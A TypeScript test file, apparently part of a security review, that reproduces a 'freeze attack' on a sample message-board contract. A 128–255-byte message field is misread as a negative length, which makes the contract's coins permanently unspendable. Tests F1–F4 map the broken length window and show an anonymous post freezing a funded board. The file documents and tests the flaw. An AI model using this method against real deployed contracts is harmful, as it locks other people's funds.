import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { callChain, validateInput, stateOf, key, firstLine, type Verdict } from './harness.js';

/**
 * FREEZE ATTACK — a ByteString state field of 128..255 bytes makes the UTXO
 * unspendable.
 *
 * The covenant re-derives the next state section by walking the current
 * script's push prefixes. For a field in the OP_PUSHDATA1 range it reads the
 * single length byte with OP_BIN2NUM, which is a SIGNED sign-magnitude decode:
 *
 *     length byte 0x01..0x7f  ->   1..127     (fine)
 *     length byte 0x80..0xff  -> -128..-1     (negative)
 *
 * The next OP_SPLIT then gets a negative index and aborts the script. So the
 * spend that STORES the value succeeds, and every spend AFTER it fails: the
 * coins are stranded in a UTXO nobody can spend, with no compile-time warning
 * and no SDK error.
 */

const BOARD = 'examples/ts/message-board/MessageBoard.runar.ts';
const boardSource = readFileSync(BOARD, 'utf8');

const msg = (n: number) => '68697320'.repeat(Math.ceil(n / 4)).slice(0, n * 2).padEnd(n * 2, '0');

/** Deploy the board holding `satoshis`, then post `postLen` bytes, then try to
 *  post again (an anonymous anyone-can-post call). */
// Amounts are left to the SDK on purpose: a stateful continuation must carry at
// least its input value, so an explicit `satoshis` below the contract UTXO would
// be refused as a value attack and stop measuring message length.
async function board(initial: number, first: number, then?: number) {
  const steps: any[] = [{ method: 'post', args: [msg(first)], signerKey: 'bob' }];
  if (then !== undefined) steps.push({ method: 'post', args: [msg(then)], signerKey: 'charlie' });
  const r = await callChain(boardSource, BOARD, [msg(initial), key('alice').pubKey], { message: msg(initial), owner: key('alice').pubKey }, steps, { satoshis: 500_000 }, 2_000_000);
  const firstTx = r.txs[1]!;
  const firstVerdict = validateInput(firstTx, 0, r.txs[0]!, 0);
  const firstState = stateOf(r.artifact, firstTx) as any;
  // 'n/a' until a second step actually exists, so a one-step run cannot be
    // misread as "the second spend was accepted".
    let secondVerdict: Omit<Verdict, 'ok'> & { ok: boolean | 'n/a' } = { ok: 'n/a' };
  if (steps.length > 1) secondVerdict = validateInput(r.txs[2]!, 0, firstTx, 0);
  return { r, firstVerdict, firstState, secondVerdict, firstTx };
}

describe('freeze attack via oversized ByteString state', () => {
  it('F1 locate the frozen length window', async () => {
    for (const len of [1, 60, 120, 126, 127, 128, 129, 130, 150, 200, 254, 255, 256, 257, 400, 520]) {
      try {
        const r = await board(8, len, 8);
        const tag = r.firstVerdict.ok ? (r.secondVerdict.ok === true ? 'usable' : '*** FROZEN by this post ***') : 'post itself rejected';
        console.log(`  post ${String(len).padStart(3)} bytes: stored=${r.firstVerdict.ok ? 'ok' : 'no'} nextPost=${r.secondVerdict.ok === true ? 'ok' : 'FAILS'} -> ${tag}`);
      } catch (e: any) {
        console.log(`  post ${String(len).padStart(3)} bytes: threw ${String(e.message).match(/Script evaluation error: [^\n]*/)?.[0]?.slice(0, 70) ?? firstLine(String(e.message), 80)}`);
      }
    }
  });

  it('F2 an anonymous attacker freezes a funded board in one transaction', async () => {
    let r;
    try {
      r = await board(8, 200, 8);
    } catch (e: any) {
      // The second (honest) post aborts: that IS the attack landing.
      console.log('  attacker post landed; the next honest post aborted:', String(e.message).match(/Script evaluation error: [^\n]*/)?.[0]?.slice(0, 80));
      r = undefined;
    }
    if (r) {
      console.log('attacker post (200 bytes) accepted:', r.firstVerdict.ok);
      console.log('board UTXO after the attack:', r.firstTx.outputs[0]!.satoshis, 'satoshis');
      console.log('next honest post:', r.secondVerdict.ok === true ? 'accepted' : 'REJECTED: ' + firstLine(String(r.secondVerdict.error), 80));
    }
    // Owner burn (needs a signature) is frozen too.
    try {
      const burn = await callChain(boardSource, BOARD, [msg(200), key('alice').pubKey], { message: msg(200), owner: key('alice').pubKey }, [
        { method: 'burn', args: [null], signerKey: 'alice' },
      ], { satoshis: 500_000 }, 2_000_000);
      const v = validateInput(burn.txs[1]!, 0, burn.txs[0]!, 0);
      console.log('owner burn() on a 200-byte board:', v.ok ? 'accepted' : 'REJECTED: ' + firstLine(v.error, 80));
    } catch (e: any) {
      console.log('owner burn() threw:', String(e.message).match(/Script evaluation error: [^\n]*/)?.[0]?.slice(0, 90) ?? String(e.message).slice(0, 90));
    }
  });

  it('F3 the same board with an in-range message keeps working (control)', async () => {
    const r = await board(8, 127, 8);
    console.log('  127-byte post then another post:', r.firstVerdict.ok && r.secondVerdict.ok === true ? 'both fine' : 'broken');
    const r2 = await board(8, 300, 8);
    console.log('  300-byte post (OP_PUSHDATA2 path) then another post:', r2.firstVerdict.ok && r2.secondVerdict.ok === true ? 'both fine' : 'broken');
  });

  it('F4 a board deployed straight into the window is born frozen', async () => {
    try {
      const r = await board(200, 8, undefined);
      console.log('  deploy with a 200-byte message, first spend verdict:', r.firstVerdict.ok ? 'accepted' : 'REJECTED');
      expect(r.firstVerdict.ok).toBe(false);
    } catch (e: any) {
      console.log('  deploy with a 200-byte message: the very first spend aborts —', String(e.message).match(/Script evaluation error: [^\n]*/)?.[0]?.slice(0, 70));
    }
  });
});
